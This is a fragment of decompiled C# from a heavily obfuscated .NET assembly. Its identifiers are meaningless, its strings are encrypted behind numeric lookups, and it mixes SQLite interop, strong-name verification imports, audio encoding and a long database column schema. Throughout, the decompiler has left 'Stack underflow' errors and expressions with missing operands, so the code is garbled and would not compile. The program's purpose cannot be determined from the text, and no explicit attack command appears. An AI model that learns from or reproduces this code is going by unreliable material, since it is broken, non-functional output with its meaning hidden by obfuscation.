			if (((global::_0017._0080)/*Error near IL_000d: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107349950));
			}
			return _0018._0001(P_1._0001, P_1._0003, _0002);
		}

		static byte[] _0001(global::_0002._0002 P_0)
		{
			//IL_0069: Incompatible stack heights: 0 vs 3
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			_ = _007F_0002._007E_0083_0005;
			_ = _0005_0003._007E_0082_0006;
			BinaryReader binaryReader = ((global::_0002._0002)/*Error near IL_0011: Stack underflow*/)._0001;
			/*Error near IL_0070: Stack underflow*/(binaryReader);
			long num = ((global::_0002._0002)/*Error near IL_001a: Stack underflow*/)._0001;
			/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, num);
			byte[] array = _0083_0002._007E_008C_0005(P_0._0001, (int)P_0._0001);
			if (array.Length != P_0._0001)
			{
				throw new InvalidDataException(_009D._0093_0004(_0080._0014._0001(107379488), P_0, array.Length));
			}
			return array;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_changes_interop")]
		static extern int _0001(IntPtr _0002);

		static int _0001(BinaryReader _0002)
		{
			//IL_004a: Incompatible stack heights: 0 vs 2
			int num = 0;
			for (int i = 0; i < 4; i++)
			{
				_ = _008D_0002._007E_0096_0005;
				byte b = /*Error near IL_0014: Stack underflow*/((object)/*Error near IL_0014: Stack underflow*/);
				num <<= 7;
				num += b & 0x7F;
				if ((b & 0x80) == 0)
				{
					return num;
				}
			}
			throw new FormatException(_0080._0014._0001(107378935));
		}

		static void _0001(global::_0001._007F _0002, int P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(_0002._0001, P_1);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._0006 P_0)
		{
			//IL_00c9: Incompatible stack heights: 0 vs 1
			_0005[] array = ((global::_0017._0006)/*Error near IL_000a: Stack underflow*/)._0001;
			int i = default(int);
			if (0 == 0)
			{
				i = 0;
			}
			for (; i < array.Length; i++)
			{
				_0005 obj = array[i];
				if ((obj._0001._0001 & global::_000E._0004._0004) != global::_000E._0004._0004)
				{
					_0018._0001(obj);
				}
			}
			while (P_0._0001)
			{
				if (!global::_001B._007E_0094_0003(P_0._0001) || !P_0._0001)
				{
					continue;
				}
				array = P_0._0001;
				foreach (_0005 obj2 in array)
				{
					if ((obj2._0001._0001 & global::_000E._0004._0002) == global::_000E._0004._0002)
					{
						if (P_0._0001 != null)
						{
							P_0._0001(P_0, new global::_0001._0006(obj2._0001, obj2._0001._0002));
						}
						_0018._0001(obj2);
					}
				}
			}
		}

		static void _0001(global::_0017._0080 P_0)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0031: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107378882));
			}
			P_0._0001._0001();
		}

		static void _0001(global::_0004._0008 P_0)
		{
			//IL_00d8: Incompatible stack heights: 0 vs 2
			//IL_00e2: Incompatible stack heights: 0 vs 3
			//IL_00ec: Incompatible stack heights: 0 vs 1
			_ = _009F_0002._007E_001C_0006;
			_ = ((global::_0004._0008)/*Error near IL_000f: Stack underflow*/)._0001;
			_ = _0087_0003._007E_0081_0007;
			_0082_0002._0088_0005();
			_0080._0014._0001(107361669);
			byte[] array = /*Error near IL_002d: Stack underflow*/((object)/*Error near IL_002d: Stack underflow*/, (string)/*Error near IL_002d: Stack underflow*/);
			/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/, array);
			_009F_0002._007E_001C_0006(P_0._0001, _0018._0001(18, P_0));
			_009F_0002._007E_001C_0006(P_0._0001, _0018._0001(P_0, P_0._0001._0001));
			P_0._0002 = global::_0012._007E_0091_0002(P_0._0001);
			_009D_0002._007E_0016_0006(P_0._0001, 0);
			_009F_0002._007E_001C_0006(P_0._0001, _0018._0001(P_0, P_0._0001._0003));
			_009F_0002._007E_001C_0006(P_0._0001, _0018._0001((double)P_0._0001._0001));
		}

		static string _0001(global::_0017._0015 P_0)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			new StringBuilder(256);
			StringBuilder stringBuilder = default(StringBuilder);
			if (0 == 0)
			{
				stringBuilder = (StringBuilder)/*Error near IL_0037: Stack underflow*/;
			}
			((global::_0017._0015)/*Error near IL_0012: Stack underflow*/)._0001._0001(P_0._0001, stringBuilder);
			return global::_0002._007E_0006(stringBuilder);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(string[] _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			_0018._0001();
			global::_0017._0080 obj = (global::_0017._0080)/*Error near IL_0024: Stack underflow*/;
			_0018._0001((global::_0017._0080)/*Error near IL_000c: Stack underflow*/);
			_0018._0001(obj);
			_0018._0001(obj);
		}

		static void _0001(_0019._0010 _0002, int P_1)
		{
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 2
			object obj = ((_0019._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				if (P_1 >= _0002._0003)
				{
					_0018._0001(_0002);
					return;
				}
				_0002._0003 -= P_1;
				_0002._0002 += P_1;
				_0002._0002 %= _0002._0001.Length;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static byte[] _0001(IntPtr _0002, int _0003)
		{
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_003c: Stack underflow*/((IntPtr)/*Error near IL_003c: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				return null;
			}
			if ((int)/*Error near IL_0016: Stack underflow*/ == 0)
			{
				return new byte[0];
			}
			byte[] array = new byte[_0003];
			_0011_0003._008D_0006(_0002, array, 0, _0003);
			return array;
		}

		static void _0001(string _0002, global::_0016._0001 P_1)
		{
			//IL_0137: Incompatible stack heights: 0 vs 1
			//IL_013d: Incompatible stack heights: 0 vs 1
			//IL_0147: Incompatible stack heights: 0 vs 1
			try
			{
				_0018._0001((global::_0016._0001)/*Error near IL_0147: Stack underflow*/, (string)/*Error near IL_0147: Stack underflow*/);
				IEnumerator<string> enumerator = ((IEnumerable<string>)/*Error near IL_0017: Stack underflow*/).GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						string current = enumerator.Current;
						int num = _008A_0004._007E_0001_000E(current, global::_000E._008A_0002(_0080._0014._0001(107378841), new char[1] { '!' })[0]);
						if (num < 0)
						{
							num = 0;
						}
						string text = _009E_0003._007E_009E_0007(current, num);
						if (P_1._0003.Contains(global::_0002._007E_0008(text)))
						{
							string text2 = P_1._0001._0001._0001(current, _0003: true);
							_0018._0001(P_1._0001, (byte[])null, _0084._000F_0004(global::_000E._008A_0002(_0080._0014._0001(107378792), new char[1] { '!' })[0], current, global::_000E._008A_0002(_0080._0014._0001(107378759), new char[1] { '!' })[0], text2), false);
						}
						if (P_1._0001._0008)
						{
							break;
						}
					}
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
			}
			catch
			{
			}
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_004e: Incompatible stack heights: 0 vs 2
			//IL_0055: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0055: Stack underflow*/((IntPtr)/*Error near IL_0055: Stack underflow*/);
			short* ptr = (short*)/*Error near IL_0058: Stack underflow*/;
			short* ptr2 = (short*)_0010_0005._0096_000E(_0003[0]);
			short* ptr3 = (short*)_0010_0005._0096_000E(_0003[1]);
			for (int i = 0; i < _0005; i++)
			{
				short* num = ptr2;
				ptr2 = num + 1;
				*num = *ptr;
				short* num2 = ptr3;
				ptr3 = num2 + 1;
				*num2 = ptr[1];
				ptr += 2;
			}
		}

		static MediaType _0001(global::_0007._0013 _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			((global::_0007._0013)/*Error near IL_0018: Stack underflow*/)._0001(-3, out _0019._0012 _);
			return new MediaType((_0019._0012)/*Error near IL_000f: Stack underflow*/);
		}

		static void _0001(global::_0017._0080 _0002)
		{
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0065: Stack underflow*/);
			global::_0010._001C obj = (global::_0010._001C)/*Error near IL_0068: Stack underflow*/;
			_0082_0003._007E_0011_0007(obj, _0080._0014._0001(107378730));
			_0014 obj2 = _0018._0001(obj);
			while (global::_001B._007E_008F_0003(obj2))
			{
				string text = _009E_0003._007E_0001_0008(obj2, 0);
				_0015_0004._001F_0008(text);
			}
			global::_0008._007E_0010_0002(_0002);
		}

		static void _0001(_001A._0011 P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			((_001A._0011)/*Error near IL_0010: Stack underflow*/)._0001 = 1E-25;
		}

		static byte[] _0001(global::_0001._001A _0002, DateTime P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0001._001A)/*Error near IL_0017: Stack underflow*/, (DateTime)/*Error near IL_0017: Stack underflow*/);
			return _0018._0001((string)/*Error near IL_000b: Stack underflow*/);
		}

		static void _0001(double _0002, int _0003, IntPtr _0004)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			_ = _0017_0006._0006_0010;
			_ = _0001_0004._0006_0008;
			long num = /*Error near IL_0015: Stack underflow*/((double)/*Error near IL_0015: Stack underflow*/);
			/*Error near IL_001a: Stack underflow*/((IntPtr)/*Error near IL_001a: Stack underflow*/, (int)/*Error near IL_001a: Stack underflow*/, num);
		}

		[DllImport("winmm.dll", EntryPoint = "midiStreamOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, IntPtr _0006, int _0007);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_compileoption_get")]
		static extern IntPtr _0001(int _0002);

		static void _0001(string _0002, _001C._0004 _0003, MediaFoundationEncoder P_2)
		{
			//IL_0093: Incompatible stack heights: 0 vs 1
			//IL_009d: Incompatible stack heights: 0 vs 1
			//IL_00a3: Incompatible stack heights: 0 vs 1
			_ = ((_001C._0004)/*Error near IL_009d: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_000f: Stack underflow*/)._0001 != WaveFormatEncoding.Pcm && ((_001C._0004)/*Error near IL_001c: Stack underflow*/).WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(_0080._0014._0001(107378693));
			}
			MediaType mediaType = new MediaType(_0003.WaveFormat);
			global::_000E._0016 obj = _0018._0001(_0002);
			try
			{
				obj._0001(P_2._0001._0001, out var num);
				obj._0001(num, mediaType._0001, null);
				_0018._0001(obj, P_2, num, _0003);
			}
			finally
			{
				_0098._008A_0004(obj);
				_0098._008A_0004(mediaType._0001);
			}
		}

		static string _0001(IFormatProvider _0002, string _0003, params object[] _0004)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			_0018._0001();
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = _009E._0094_0004;
				return /*Error near IL_0012: Stack underflow*/((string)/*Error near IL_0012: Stack underflow*/, (object[])/*Error near IL_0012: Stack underflow*/);
			}
			return _0096._0087_0004(_0002, _0003, _0004);
		}

		static _0016 _0001(global::_0010._001C P_0)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0010._001C)/*Error near IL_0014: Stack underflow*/);
			return new _0016((IDbCommand)/*Error near IL_000b: Stack underflow*/);
		}

		static void _0001(_001D._0002 _0002, global::_000E._0001[] P_1)
		{
			//IL_0085: Incompatible stack heights: 0 vs 1
			//IL_008b: Incompatible stack heights: 0 vs 2
			for (int i = 0; i < ((global::_0016._0002<global::_0017._0002>)_0002)._0001.Count - 1; i++)
			{
				_ = ((global::_0016._0002<global::_0017._0002>)/*Error near IL_000f: Stack underflow*/)._0001;
				global::_0017._0002 obj = ((List<global::_0017._0002>)/*Error near IL_0016: Stack underflow*/)[(int)/*Error near IL_0016: Stack underflow*/];
				obj._0001 = new global::_000E._0001[obj._0002 - obj._0001 + 1];
				_0099_0002._0010_0006(P_1, obj._0001, obj._0001, 0, obj._0001.Length);
			}
			((global::_0016._0002<global::_0017._0002>)_0002)._0001.RemoveAt(((global::_0016._0002<global::_0017._0002>)_0002)._0001.Count - 1);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_0080._0004 _0002, byte[] P_1)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			((_0080._0004)/*Error near IL_0009: Stack underflow*/)._0001 = (byte[])/*Error near IL_0009: Stack underflow*/;
			((_0080._0004)/*Error near IL_0011: Stack underflow*/)._0001 = 0;
		}

		static void _0001(global::_0001._007F P_0)
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002c: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_0._0001);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(IntPtr _0002, IntPtr _0003, IntPtr _0004, IntPtr _0005)
		{
			//IL_0081: Incompatible stack heights: 0 vs 1
			//IL_008d: Incompatible stack heights: 0 vs 2
			new _001A._0004();
			_001A._0004 obj = (_001A._0004)/*Error near IL_0087: Stack underflow*/;
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			if (/*Error near IL_001b: Stack underflow*/((IntPtr)/*Error near IL_001b: Stack underflow*/, zero))
			{
				obj.Guid = Guid.Empty;
			}
			else
			{
				byte[] array = new byte[16];
				_0011_0003._008D_0006(_0002, array, 0, 16);
				obj.Guid = new Guid(array);
			}
			obj.Description = _0090_0003._008E_0007(_0003);
			obj.ModuleName = _0090_0003._008E_0007(_0004);
			global::_000E._0008._0001.Add(obj);
			return true;
		}

		static long _0001(MediaFoundationEncoder _0002, global::_000E._0016 _0003, int _0004, _001C._0004 _0005, long _0006, byte[] P_5)
		{
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			long num = 0L;
			_0018._0001(((Array)/*Error near IL_000d: Stack underflow*/).Length);
			global::_0018._0015 obj = (global::_0018._0015)/*Error near IL_0014: Stack underflow*/;
			obj._0002(out var count);
			global::_0016._0015 obj2 = _0018._0001();
			obj2._0001(obj);
			obj._0001(out var intPtr, out count, out var _);
			int num3 = _0005.Read(P_5, 0, count);
			if (num3 > 0)
			{
				num = _0018._0001(_0005.WaveFormat, num3);
				_0088_0005._0017_000F(P_5, 0, intPtr, num3);
				obj._0001(num3);
				obj._0001();
				obj2._0001(_0006);
				obj2._0002(num);
				_0003._0001(_0004, obj2);
			}
			else
			{
				obj._0001();
			}
			_0098._008A_0004(obj2);
			_0098._008A_0004(obj);
			return num;
		}

		static long _0001(double _0002)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_001d: Expected F8, but got Unknown
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = global::_0015._0003_0003;
			_003F val = /*Error near IL_0011: Stack underflow*/* 86400000.0;
			/*Error near IL_001d: Stack underflow*/((double)val);
			return (long)/*Error near IL_0014: Stack underflow*/;
		}

		static void _0001(global::_0008._0001 _0002, string P_1)
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			try
			{
				_ = _0015_0004._007F_0008;
				/*Error near IL_0017: Stack underflow*/((string)/*Error near IL_0017: Stack underflow*/);
			}
			catch
			{
			}
		}

		static global::_0001._001D _0001()
		{
			//IL_0627: Incompatible stack heights: 0 vs 1
			//IL_0631: Incompatible stack heights: 0 vs 2
			global::_0006._0018[] array = new global::_0006._0018[72];
			_ = 0;
			_0080._0014._0001(107379144);
			global::_0006._0018 obj = new global::_0006._0018((string)/*Error near IL_0024: Stack underflow*/, DbType.Int64, _001B_001D_0006: false);
			((object[])/*Error near IL_0025: Stack underflow*/)[/*Error near IL_0025: Stack underflow*/] = obj;
			array[1] = new global::_0006._0018(_0080._0014._0001(107379167), DbType.UInt64, _001B_001D_0006: false);
			array[2] = new global::_0006._0018(_0080._0014._0001(107361953), DbType.Binary, _001B_001D_0006: false);
			array[3] = new global::_0006._0018(_0080._0014._0001(107379154), DbType.Boolean, _001B_001D_0006: true);
			array[4] = new global::_0006._0018(_0080._0014._0001(107379117), DbType.Binary, _001B_001D_0006: true);
			array[5] = new global::_0006._0018(_0080._0014._0001(107379108), DbType.Boolean, _001B_001D_0006: false);
			array[6] = new global::_0006._0018(_0080._0014._0001(107379131), DbType.Boolean, _001B_001D_0006: false);
			array[7] = new global::_0006._0018(_0080._0014._0001(107379086), DbType.AnsiStringFixedLength, _001B_001D_0006: true);
			array[8] = new global::_0006._0018(_0080._0014._0001(107379077), DbType.String, _001B_001D_0006: false);
			array[9] = new global::_0006._0018(_0080._0014._0001(107379100), DbType.Int64, _001B_001D_0006: false);
			array[10] = new global::_0006._0018(_0080._0014._0001(107379055), DbType.Decimal, _001B_001D_0006: false);
			array[11] = new global::_0006._0018(_0080._0014._0001(107379042), DbType.DateTime, _001B_001D_0006: false);
			array[12] = new global::_0006._0018(_0080._0014._0001(107379065), DbType.DateTime, _001B_001D_0006: true);
			array[13] = new global::_0006._0018(_0080._0014._0001(107379020), DbType.Decimal, _001B_001D_0006: true);
			array[14] = new global::_0006._0018(_0080._0014._0001(107379039), DbType.Double, _001B_001D_0006: false);
			array[15] = new global::_0006._0018(_0080._0014._0001(107379030), DbType.Double, _001B_001D_0006: false);
			array[16] = new global::_0006._0018(_0080._0014._0001(107378989), DbType.Binary, _001B_001D_0006: false);
			array[17] = new global::_0006._0018(_0080._0014._0001(107378976), DbType.Guid, _001B_001D_0006: false);
			array[18] = new global::_0006._0018(_0080._0014._0001(107378999), DbType.Int64, _001B_001D_0006: false);
			array[19] = new global::_0006._0018(_0080._0014._0001(107378954), DbType.Binary, _001B_001D_0006: false);
			array[20] = new global::_0006._0018(_0080._0014._0001(107378945), DbType.Int32, _001B_001D_0006: true);
			array[21] = new global::_0006._0018(_0080._0014._0001(107378972), DbType.SByte, _001B_001D_0006: false);
			array[22] = new global::_0006._0018(_0080._0014._0001(107378963), DbType.Int16, _001B_001D_0006: false);
			array[23] = new global::_0006._0018(_0080._0014._0001(107378410), DbType.Int32, _001B_001D_0006: false);
			array[24] = new global::_0006._0018(_0080._0014._0001(107378401), DbType.Int64, _001B_001D_0006: false);
			array[25] = new global::_0006._0018(_0080._0014._0001(107362015), DbType.Int64, _001B_001D_0006: true);
			array[26] = new global::_0006._0018(_0080._0014._0001(107378424), DbType.SByte, _001B_001D_0006: false);
			array[27] = new global::_0006._0018(_0080._0014._0001(107378379), DbType.Int16, _001B_001D_0006: false);
			array[28] = new global::_0006._0018(_0080._0014._0001(107378398), DbType.Int32, _001B_001D_0006: false);
			array[29] = new global::_0006._0018(_0080._0014._0001(107378385), DbType.Int64, _001B_001D_0006: false);
			array[30] = new global::_0006._0018(_0080._0014._0001(107378340), DbType.Boolean, _001B_001D_0006: false);
			array[31] = new global::_0006._0018(_0080._0014._0001(107378359), DbType.Int64, _001B_001D_0006: false);
			array[32] = new global::_0006._0018(_0080._0014._0001(107378318), DbType.String, _001B_001D_0006: false);
			array[33] = new global::_0006._0018(_0080._0014._0001(107378305), DbType.String, _001B_001D_0006: false);
			array[34] = new global::_0006._0018(_0080._0014._0001(107378324), DbType.String, _001B_001D_0006: false);
			array[35] = new global::_0006._0018(_0080._0014._0001(107378275), DbType.String, _001B_001D_0006: false);
			array[36] = new global::_0006._0018(_0080._0014._0001(107378298), DbType.Decimal, _001B_001D_0006: false);
			array[37] = new global::_0006._0018(_0080._0014._0001(107378289), DbType.StringFixedLength, _001B_001D_0006: true);
			array[38] = new global::_0006._0018(_0080._0014._0001(107378248), DbType.String, _001B_001D_0006: false);
			array[39] = new global::_0006._0018(_0080._0014._0001(107378271), DbType.String, _001B_001D_0006: false);
			array[40] = new global::_0006._0018(_0080._0014._0001(107378262), DbType.Decimal, _001B_001D_0006: false);
			array[41] = new global::_0006._0018(_0080._0014._0001(107378221), DbType.Decimal, _001B_001D_0006: false);
			array[42] = new global::_0006._0018(_0080._0014._0001(107378208), DbType.String, _001B_001D_0006: true);
			array[43] = new global::_0006._0018(_0080._0014._0001(107378227), DbType.Binary, _001B_001D_0006: false);
			array[44] = new global::_0006._0018(_0080._0014._0001(107378182), DbType.Binary, _001B_001D_0006: false);
			array[45] = new global::_0006._0018(_0080._0014._0001(107378177), DbType.Double, _001B_001D_0006: true);
			array[46] = new global::_0006._0018(_0080._0014._0001(107378200), DbType.Single, _001B_001D_0006: true);
			array[47] = new global::_0006._0018(_0080._0014._0001(107378671), DbType.DateTime, _001B_001D_0006: false);
			array[48] = new global::_0006._0018(_0080._0014._0001(107378658), DbType.Int16, _001B_001D_0006: true);
			array[49] = new global::_0006._0018(_0080._0014._0001(107378677), DbType.UInt16, _001B_001D_0006: true);
			array[50] = new global::_0006._0018(_0080._0014._0001(107378632), DbType.String, _001B_001D_0006: false);
			array[51] = new global::_0006._0018(_0080._0014._0001(107378655), DbType.String, _001B_001D_0006: false);
			array[52] = new global::_0006._0018(_0080._0014._0001(107378646), DbType.DateTime, _001B_001D_0006: false);
			array[53] = new global::_0006._0018(_0080._0014._0001(107378605), DbType.DateTime, _001B_001D_0006: false);
			array[54] = new global::_0006._0018(_0080._0014._0001(107378592), DbType.Byte, _001B_001D_0006: true);
			array[55] = new global::_0006._0018(_0080._0014._0001(107378611), DbType.SByte, _001B_001D_0006: true);
			array[56] = new global::_0006._0018(_0080._0014._0001(107378566), DbType.UInt32, _001B_001D_0006: true);
			array[57] = new global::_0006._0018(_0080._0014._0001(107378589), DbType.Byte, _001B_001D_0006: false);
			array[58] = new global::_0006._0018(_0080._0014._0001(107378580), DbType.UInt16, _001B_001D_0006: false);
			array[59] = new global::_0006._0018(_0080._0014._0001(107378539), DbType.UInt32, _001B_001D_0006: false);
			array[60] = new global::_0006._0018(_0080._0014._0001(107378530), DbType.UInt64, _001B_001D_0006: false);
			array[61] = new global::_0006._0018(_0080._0014._0001(107378553), DbType.UInt64, _001B_001D_0006: false);
			array[62] = new global::_0006._0018(_0080._0014._0001(107378544), DbType.Guid, _001B_001D_0006: true);
			array[63] = new global::_0006._0018(_0080._0014._0001(107378519), DbType.UInt64, _001B_001D_0006: true);
			array[64] = new global::_0006._0018(_0080._0014._0001(107378466), DbType.Byte, _001B_001D_0006: false);
			array[65] = new global::_0006._0018(_0080._0014._0001(107378441), DbType.UInt16, _001B_001D_0006: false);
			array[66] = new global::_0006._0018(_0080._0014._0001(107378448), DbType.UInt32, _001B_001D_0006: false);
			array[67] = new global::_0006._0018(_0080._0014._0001(107377911), DbType.UInt64, _001B_001D_0006: false);
			array[68] = new global::_0006._0018(_0080._0014._0001(107377886), DbType.Binary, _001B_001D_0006: false);
			array[69] = new global::_0006._0018(_0080._0014._0001(107377873), DbType.AnsiString, _001B_001D_0006: true);
			array[70] = new global::_0006._0018(_0080._0014._0001(107377828), DbType.AnsiString, _001B_001D_0006: false);
			array[71] = new global::_0006._0018(_0080._0014._0001(107377847), DbType.Boolean, _001B_001D_0006: false);
			return new global::_0001._001D(array);
		}

		static void _0001(global::_0016._0014 _0002, int P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			_ = ((global::_0016._0014)/*Error near IL_0007: Stack underflow*/)._0001.Count;
			for (int i = (int)/*Error near IL_0031: Stack underflow*/; i < P_1; i++)
			{
				_0002._0001.Add(new List<global::_0013._0010>());
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _0016 _0001(string _0002, global::_0007._001E _0003, DbType P_2)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			new _0016((string)/*Error near IL_001c: Stack underflow*/, (DbType)/*Error near IL_001c: Stack underflow*/);
			_0016 obj = (_0016)/*Error near IL_0007: Stack underflow*/;
			_0003.Add(obj);
			return obj;
		}

		[DllImport("msdmo.dll", EntryPoint = "MoFreeMediaType")]
		static extern int _0001([In] ref _001B._0004 _0002);

		static void _0001(float _0002, int _0003, global::_000E._001A P_2)
		{
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107377806);
			((global::_000E._001A)/*Error near IL_0010: Stack underflow*/)._0001((int)/*Error near IL_0010: Stack underflow*/, (string)/*Error near IL_0010: Stack underflow*/);
			if (_0002 < 0f)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107377797), _0080._0014._0001(107388818));
			}
			if (_0002 > 1f)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107377797), _0080._0014._0001(107388818));
			}
			global::_0007._0097(P_2._0001._0001((uint)_0003, _0002));
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_reset_interop")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static global::_0010._0019 _0001()
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			new _001F._0015();
			_0018._0001((_001F._0015)/*Error near IL_0013: Stack underflow*/, global::_0016._0019._0002, _0019._0016._0001);
			return (global::_0010._0019)/*Error near IL_0007: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_create_disposable_module")]
		static extern IntPtr _0001(IntPtr _0002, IntPtr _0003, ref global::_0017._0084._001D _0004, IntPtr _0005, global::_0017._0084._001C _0006);

		static void _0001(string _0002, _0080._0017 _0003)
		{
